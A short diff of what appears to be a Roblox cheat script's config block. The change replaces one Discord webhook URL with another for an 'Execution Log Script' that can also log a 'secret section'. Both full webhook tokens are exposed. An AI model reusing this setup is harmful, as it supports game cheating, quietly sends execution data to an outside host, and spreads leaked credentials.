@@ -24,7 +24,7 @@ local money = 1000000000000000000000
 
 --// Config
 getgenv().whscript = "unknown hub"        --Change to the name of your script
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1339389926919114792/WjvcD8YG2vt0fIPqV05U-ZmF798100G-uEsOC_k4pzB4jbIpjW_cSY2jqmKfvPEZTCZJ"  --Put your Webhook Url here
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1340809792402493482/bDWYXosRyhzsWpxqEz-JbHoKrpq-PUK4Kh2JBYGyxOER0UGH3yNPIPK6zESWLC11uChZ"  --Put your Webhook Url here
 getgenv().ExecLogSecret = true                --decide to also log secret section
 
 --// Execution Log Script
